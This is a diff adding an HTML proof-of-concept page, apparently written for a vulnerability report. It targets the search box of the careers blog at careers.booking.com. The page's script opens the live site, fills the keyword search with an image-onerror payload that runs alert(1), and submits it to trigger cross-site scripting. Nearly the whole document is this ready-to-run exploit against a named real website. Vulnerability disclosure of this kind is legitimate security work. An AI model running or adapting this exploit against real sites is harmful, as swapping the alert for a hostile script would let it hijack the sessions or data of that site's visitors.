@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XSS PoC – Booking Careers Blog</title>
+  </head>
+  <body>
+    <p>If you're not redirected, <a href="https://careers.booking.com/blog" target="_blank">click here</a>.</p>
+
+    <script>
+      const win = window.open('https://careers.booking.com/blog', '_blank');
+
+      const payload = `<Img Src=OnXSS OnError=(alert)(1)>`;
+
+      const inject = () => {
+        try {
+          const i = win.document.querySelector('input.keyword-search__bar');
+          const b = win.document.querySelector('button.keyword-search__submit-btn');
+          if (!i || !b) return setTimeout(inject, 200);
+          i.value = payload;
+          i.dispatchEvent(new Event('input', { bubbles: true }));
+          b.click();
+        } catch (e) {
+          setTimeout(inject, 200);
+        }
+      };
+
+      setTimeout(inject, 1000);
+    </script>
+  </body>
+</html>
